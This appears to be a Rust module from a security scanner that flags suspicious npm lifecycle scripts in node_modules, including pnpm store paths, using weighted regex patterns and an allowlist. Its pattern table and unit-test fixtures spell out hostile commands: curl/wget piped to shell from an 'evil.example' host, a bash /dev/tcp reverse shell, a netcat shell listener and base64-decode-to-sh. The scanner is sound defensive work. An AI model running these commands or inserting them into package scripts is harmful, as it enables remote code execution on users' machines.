//! Postinstall / preinstall / install script backdoor sweep.
//!
//! Walks `<project>/node_modules` looking for `package.json` lifecycle
//! scripts that match known supply-chain-attack shapes. Findings flow
//! through the existing [`crate::sca::FindingType::PersistenceArtifact`]
//! variant alongside the `.pth` site-packages sweep, so the CLI render
//! path needs no changes.
//!
//! # Why this exists
//!
//! The threat-DB layer catches *known-bad* package versions. It misses
//! the moment a freshly published trojanized version lands and runs its
//! postinstall on `npm install`. Real cases this targets:
//!
//! * `event-stream@3.3.6` (2018) — postinstall pulled an extra package
//!   that injected a bitcoin-stealer.
//! * `ua-parser-js@0.7.29 / 0.8.0 / 1.0.0` (2021) — postinstall ran a
//!   curl-to-shell that dropped a Linux miner + Windows password
//!   stealer.
//!
//! # FP control
//!
//! The hard part is *not* flagging legitimate native-build postinstalls
//! (sharp, bcrypt, prisma, husky, electron-rebuild, …). Two safeguards:
//!
//! 1. Allowlist of known-legit script prefixes — match resets the score
//!    to zero short-circuit before any pattern check.
//! 2. Confidence scoring on the suspicious patterns. Each pattern carries
//!    a weight; a script needs total weight ≥ [`SCORE_THRESHOLD`] to
//!    fire. Lone `eval` (weight 1) does not trigger by itself.
//!
//! # pnpm reach
//!
//! pnpm hoists deps under `node_modules/.pnpm/<key>/node_modules/<pkg>/`
//! and links the user-facing path to that store via symlinks. Walking
//! through symlinks is fragile on Windows and can loop; this module
//! instead walks the explicit `.pnpm` store path so pnpm projects are
//! never invisible.

use std::fs;
use std::path::{Path, PathBuf};

use regex::Regex;

use crate::sca::{Finding, FindingType};

/// Confidence threshold for flagging a script. A script's matched-pattern
/// weights must sum to ≥ this value to fire. Set strict (≥2) so a lone
/// `eval` keyword (weight 1) doesn't trip it; loosening later is easier
/// than walking back a wave of false positives.
const SCORE_THRESHOLD: u32 = 2;

/// Lifecycle scripts that run during `npm install`. Order is the order
/// findings will appear when both pre and post fire on one manifest.
const SCRIPT_KEYS: &[&str] = &["preinstall", "install", "postinstall"];

/// Script-prefix allowlist. A script that *starts with* any of these
/// strings (after trimming) is treated as legitimate and not scored.
/// Matching `starts_with` rather than full equality so flags / paths
/// appended to the recognised binary don't break the match.
const ALLOWLIST_PREFIXES: &[&str] = &[
    "node-gyp rebuild",
    "node-gyp configure",
    "node-gyp build",
    "node-pre-gyp install --fallback-to-build",
    "node-pre-gyp install",
    "node ./scripts/install.js",
    "node scripts/install.js",
    "node ./install.js",
    "node install.js",
    "husky install",
    "husky",
    "prisma generate",
    "electron-rebuild",
    "electron-builder install-app-deps",
    "playwright install",
    "puppeteer install",
    "cypress install",
    "cypress verify",
    "patch-package",
    "next telemetry disable",
    "tsc --build",
    "tsc -b",
    "tsc -p .",
    "tsc",
    "npm rebuild",
    "yarn rebuild",
    "simple-git-hooks",
    "lefthook install",
];

/// Suspicious-pattern table. Keep weights tight: the threshold of 2
/// means weight-1 patterns never fire alone, weight-2+ patterns can.
fn suspicious_patterns() -> Vec<(Regex, u32, &'static str)> {
    let raw: &[(&str, u32, &str)] = &[
        // Multi-arg invocations like `wget -O - http://x | bash` need
        // `[^|\n]*` between the verb and the pipe — `\S+` stops at the
        // first space and misses everything past the first flag.
        (
            r"(curl|wget)\b[^|\n]*\|\s*(sh|bash|zsh)",
            3,
            "pipe-curl-to-shell",
        ),
        (
            r"base64\s+(-d|--decode|-D)\b[^\n]*?(\||eval)",
            4,
            "base64-decode-then-exec",
        ),
        (r"\beval\s*\(", 1, "eval-call"),
        (r#"\beval\s+["'`$]"#, 1, "eval-keyword"),
        (r"(?:\s|^)/tmp/\.[A-Za-z0-9_]", 2, "hidden-tmp-dotfile"),
        (r"(?:\s|^)/dev/shm/", 2, "shared-mem-write"),
        (r#"node\s+-e\s+["'][^"']{100,}"#, 2, "huge-inline-node-eval"),
        (
            r#"python[23]?\s+-c\s+["'][^"']*urllib"#,
            3,
            "python-urllib-c-flag",
        ),
        (r"\bnc\s+-[lke]", 3, "netcat-reverse-shell"),
        (r"bash\s+-i\s+>&\s*/dev/tcp/", 3, "bash-reverse-shell-tcp"),
    ];
    raw.iter()
        .map(|(p, w, l)| {
            (
                Regex::new(p).expect("postinstall suspicious pattern must compile"),
                *w,
                *l,
            )
        })
        .collect()
}

/// Per-script analysis result. `None` ⇒ allowlisted, skip silently.
/// `Some((score, labels))` ⇒ score may be below threshold (no finding)
/// or at/above (emit finding citing `labels`).
struct ScriptVerdict {
    score: u32,
    matched: Vec<&'static str>,
}

fn analyze_script(script: &str, patterns: &[(Regex, u32, &'static str)]) -> Option<ScriptVerdict> {
    let trimmed = script.trim();
    for prefix in ALLOWLIST_PREFIXES {
        if trimmed.starts_with(prefix) {
            return None;
        }
    }
    let mut score = 0u32;
    let mut matched: Vec<&'static str> = Vec::new();
    for (re, weight, label) in patterns {
        if re.is_match(script) {
            score += weight;
            matched.push(*label);
        }
    }
    Some(ScriptVerdict { score, matched })
}

/// Walk `<project>/node_modules` and emit one [`Finding`] per
/// suspicious lifecycle script. No-op when `node_modules` is missing.
pub fn scan_postinstall_backdoors(project_path: &Path) -> Vec<Finding> {
    let node_modules = project_path.join("node_modules");
    if !node_modules.is_dir() {
        return Vec::new();
    }
    let manifests = collect_manifests(&node_modules);
    let patterns = suspicious_patterns();
    let mut findings = Vec::new();
    for manifest in manifests {
        findings.extend(scan_one_manifest(&manifest, &patterns));
    }
    findings
}

/// Collect every `package.json` we want to inspect: one level under
/// `node_modules/`, the scoped equivalent under `node_modules/@scope/`,
/// and the pnpm store at `node_modules/.pnpm/<key>/node_modules/<pkg>`
/// (plus the scoped pnpm variant).
fn collect_manifests(node_modules: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let entries = match fs::read_dir(node_modules) {
        Ok(e) => e,
        Err(_) => return out,
    };
    for entry in entries.flatten() {
        let name = match entry.file_name().into_string() {
            Ok(s) => s,
            Err(_) => continue,
        };
        if name == ".pnpm" {
            collect_pnpm(&entry.path(), &mut out);
            continue;
        }
        if name.starts_with('.') {
            continue;
        }
        if name.starts_with('@') {
            collect_scoped(&entry.path(), &mut out);
            continue;
        }
        push_if_manifest(&entry.path(), &mut out);
    }
    out
}

fn collect_scoped(scope_dir: &Path, out: &mut Vec<PathBuf>) {
    let entries = match fs::read_dir(scope_dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        push_if_manifest(&entry.path(), out);
    }
}

fn collect_pnpm(pnpm_dir: &Path, out: &mut Vec<PathBuf>) {
    let entries = match fs::read_dir(pnpm_dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let inner = entry.path().join("node_modules");
        if !inner.is_dir() {
            continue;
        }
        let pkgs = match fs::read_dir(&inner) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for pkg in pkgs.flatten() {
            let pname = match pkg.file_name().into_string() {
                Ok(s) => s,
                Err(_) => continue,
            };
            if pname.starts_with('@') {
                collect_scoped(&pkg.path(), out);
                continue;
            }
            push_if_manifest(&pkg.path(), out);
        }
    }
}

fn push_if_manifest(pkg_dir: &Path, out: &mut Vec<PathBuf>) {
    let candidate = pkg_dir.join("package.json");
    if candidate.is_file() {
        out.push(candidate);
    }
}

fn scan_one_manifest(manifest: &Path, patterns: &[(Regex, u32, &'static str)]) -> Vec<Finding> {
    let raw = match fs::read_to_string(manifest) {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };
    let parsed: serde_json::Value = match serde_json::from_str(&raw) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };
    let pkg_name = parsed
        .get("name")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown")
        .to_string();
    let pkg_version = parsed
        .get("version")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown")
        .to_string();
    let scripts = match parsed.get("scripts").and_then(|v| v.as_object()) {
        Some(s) => s,
        None => return Vec::new(),
    };
    let mut findings = Vec::new();
    for kind in SCRIPT_KEYS {
        let script_str = match scripts.get(*kind).and_then(|v| v.as_str()) {
            Some(s) => s,
            None => continue,
        };
        let verdict = match analyze_script(script_str, patterns) {
            Some(v) => v,
            None => continue,
        };
        if verdict.score < SCORE_THRESHOLD {
            continue;
        }
        findings.push(build_finding(
            manifest,
            kind,
            script_str,
            &pkg_name,
            &pkg_version,
            &verdict.matched,
        ));
    }
    findings
}

fn build_finding(
    manifest: &Path,
    kind: &str,
    script: &str,
    package: &str,
    version: &str,
    matched_labels: &[&'static str],
) -> Finding {
    let snippet = if script.len() > 200 {
        format!("{}…", &script[..200])
    } else {
        script.to_string()
    };
    let location = format!("{}:{}", manifest.display(), kind);
    let attack_vector = format!(
        "Suspicious {kind} script in {package}@{version}: {snippet} \
         Matched patterns: {labels}. \
         npm runs preinstall/install/postinstall scripts on every \
         `npm install`, which is the same persistence vector exploited by \
         the event-stream (2018) and ua-parser-js (2021) supply-chain \
         attacks.",
        kind = kind,
        package = package,
        version = version,
        snippet = snippet,
        labels = matched_labels.join(", "),
    );
    let remediation = format!(
        "1. Inspect: {}\n\
         2. If you don't recognise this hook, remove the dep and rotate \
            credentials accessible from this machine\n\
         3. If the dep is legitimate, pin the prior known-good version \
            and report the version range to your security team",
        manifest.display()
    );
    Finding {
        package: package.to_string(),
        ecosystem: "npm".into(),
        version: version.to_string(),
        severity: "critical".into(),
        location,
        attack_vector,
        remediation,
        source: "Arcis Security Research".into(),
        references: vec![
            "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"
                .into(),
            "https://github.com/faisalman/ua-parser-js/issues/536".into(),
        ],
        finding_type: FindingType::PersistenceArtifact,
        paths: Vec::new(),
        path_count: 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    // ── analyze_script helper tests ─────────────────────────────────

    #[test]
    fn allowlist_node_gyp_rebuild_is_silent() {
        let p = suspicious_patterns();
        assert!(analyze_script("node-gyp rebuild", &p).is_none());
    }

    #[test]
    fn allowlist_starts_with_match_with_appended_flags() {
        let p = suspicious_patterns();
        assert!(
            analyze_script("node-gyp rebuild --target-arch=ia32", &p).is_none(),
            "appended flags must not break allowlist match"
        );
    }

    #[test]
    fn allowlist_husky_install_is_silent() {
        let p = suspicious_patterns();
        assert!(analyze_script("husky install", &p).is_none());
    }

    #[test]
    fn allowlist_node_pre_gyp_with_fallback_is_silent() {
        let p = suspicious_patterns();
        assert!(analyze_script("node-pre-gyp install --fallback-to-build", &p).is_none());
    }

    #[test]
    fn allowlist_node_install_js_is_silent() {
        let p = suspicious_patterns();
        // esbuild / swc / dprint pattern.
        assert!(analyze_script("node install.js", &p).is_none());
    }

    #[test]
    fn allowlist_cypress_install_is_silent() {
        let p = suspicious_patterns();
        assert!(analyze_script("cypress install", &p).is_none());
    }

    #[test]
    fn lone_eval_keyword_does_not_fire_below_threshold() {
        let p = suspicious_patterns();
        let v = analyze_script("eval(typeof(window))", &p).expect("not allowlisted");
        assert!(v.score < SCORE_THRESHOLD, "lone eval should be score 1");
    }

    #[test]
    fn curl_pipe_to_shell_fires() {
        let p = suspicious_patterns();
        let v = analyze_script("curl http://evil.example/a.sh | sh", &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
        assert!(v.matched.contains(&"pipe-curl-to-shell"));
    }

    #[test]
    fn wget_pipe_to_bash_fires() {
        let p = suspicious_patterns();
        let v = analyze_script("wget -O - http://x | bash", &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
    }

    #[test]
    fn base64_decode_pipe_fires_high_score() {
        let p = suspicious_patterns();
        let v = analyze_script("echo ZWNobyBoaQ== | base64 -d | sh", &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
        assert!(v.matched.contains(&"base64-decode-then-exec"));
    }

    #[test]
    fn netcat_reverse_shell_fires() {
        let p = suspicious_patterns();
        let v = analyze_script("nc -lke /bin/sh 4444", &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
        assert!(v.matched.contains(&"netcat-reverse-shell"));
    }

    #[test]
    fn bash_reverse_shell_dev_tcp_fires() {
        let p = suspicious_patterns();
        let v =
            analyze_script("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
        assert!(v.matched.contains(&"bash-reverse-shell-tcp"));
    }

    #[test]
    fn hidden_tmp_dotfile_write_fires() {
        let p = suspicious_patterns();
        let v = analyze_script("cat > /tmp/.x_payload && chmod +x /tmp/.x_payload", &p)
            .expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
    }

    #[test]
    fn python_urllib_c_flag_fires() {
        let p = suspicious_patterns();
        let v = analyze_script(
            "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://x\",\"/tmp/y\")'",
            &p,
        )
        .expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
    }

    #[test]
    fn huge_inline_node_eval_fires() {
        let p = suspicious_patterns();
        let huge = "x".repeat(120);
        let script = format!("node -e \"{}\"", huge);
        let v = analyze_script(&script, &p).expect("not allowlisted");
        assert!(v.score >= SCORE_THRESHOLD);
    }

    #[test]
    fn missing_scripts_block_yields_no_findings() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/p/package.json"),
            r#"{"name":"p","version":"1.0.0"}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert!(f.is_empty());
    }

    #[test]
    fn legit_postinstall_yields_no_findings() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/sharp/package.json"),
            r#"{"name":"sharp","version":"0.33.0","scripts":{"install":"node-gyp rebuild"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert!(f.is_empty(), "node-gyp rebuild must not flag");
    }

    #[test]
    fn missing_node_modules_yields_no_findings_no_error() {
        let dir = TempDir::new().unwrap();
        let f = scan_postinstall_backdoors(dir.path());
        assert!(f.is_empty());
    }

    // ── walker behaviour tests ──────────────────────────────────────

    #[test]
    fn scoped_package_is_scanned() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/@scope/pkg/package.json"),
            r#"{"name":"@scope/pkg","version":"1.0.0","scripts":{"postinstall":"curl http://evil/x|sh"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert_eq!(f.len(), 1, "@scope/pkg/package.json should be scanned");
        assert_eq!(f[0].package, "@scope/pkg");
    }

    #[test]
    fn pnpm_store_path_is_scanned() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path()
                .join("node_modules/.pnpm/evil@1.0.0/node_modules/evil/package.json"),
            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert_eq!(f.len(), 1, "pnpm store package must be scanned");
        assert_eq!(f[0].package, "evil");
    }

    #[test]
    fn pnpm_scoped_store_path_is_scanned() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path()
                .join("node_modules/.pnpm/@evil+pkg@1.0.0/node_modules/@evil/pkg/package.json"),
            r#"{"name":"@evil/pkg","version":"1.0.0","scripts":{"postinstall":"nc -lke /bin/sh 4444"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert_eq!(f.len(), 1, "scoped pnpm store package must be scanned");
        assert_eq!(f[0].package, "@evil/pkg");
    }

    #[test]
    fn nested_node_modules_inside_dep_is_not_scanned() {
        // pre-npm-7 layouts can leave nested node_modules; we deliberately
        // skip them to avoid quadratic walk + because attackers run on the
        // hoisted manifest.
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path()
                .join("node_modules/outer/node_modules/inner/package.json"),
            r#"{"name":"inner","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert!(
            f.is_empty(),
            "nested node_modules deeper than one level must NOT be scanned"
        );
    }

    #[test]
    fn dot_directories_other_than_pnpm_are_skipped() {
        // node_modules/.bin is npm's binstub directory; nothing in there
        // is a real package. The scanner must skip it without erroring.
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/.bin/package.json"),
            r#"{"name":".bin","version":"0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert!(f.is_empty(), ".bin should be skipped");
    }

    #[test]
    fn malformed_package_json_does_not_panic() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/p/package.json"),
            "not valid json {{{",
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert!(f.is_empty());
    }

    #[test]
    fn both_preinstall_and_postinstall_yield_two_findings() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/p/package.json"),
            r#"{"name":"p","version":"1.0.0","scripts":{"preinstall":"curl http://a|sh","postinstall":"wget http://b|bash"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert_eq!(f.len(), 2, "two suspicious script kinds → two findings");
        let locations: Vec<&str> = f.iter().map(|x| x.location.as_str()).collect();
        assert!(locations.iter().any(|l| l.ends_with(":preinstall")));
        assert!(locations.iter().any(|l| l.ends_with(":postinstall")));
    }

    #[test]
    fn finding_carries_persistence_artifact_type_and_npm_ecosystem() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path().join("node_modules/p/package.json"),
            r#"{"name":"p","version":"2.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let f = scan_postinstall_backdoors(dir.path());
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].finding_type, FindingType::PersistenceArtifact);
        assert_eq!(f[0].ecosystem, "npm");
        assert_eq!(f[0].severity, "critical");
        assert_eq!(f[0].package, "p");
        assert_eq!(f[0].version, "2.0.0");
        // attack_vector cites the historical incidents, not litellm.
        assert!(
            f[0].attack_vector.contains("event-stream"),
            "attack_vector must cite event-stream precedent"
        );
        assert!(
            f[0].attack_vector.contains("ua-parser-js"),
            "attack_vector must cite ua-parser-js precedent"
        );
        // path data left empty — these are tree findings, not lockfile.
        assert!(f[0].paths.is_empty());
        assert_eq!(f[0].path_count, 0);
    }

    fn write_pkg(path: PathBuf, contents: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, contents).unwrap();
    }
}
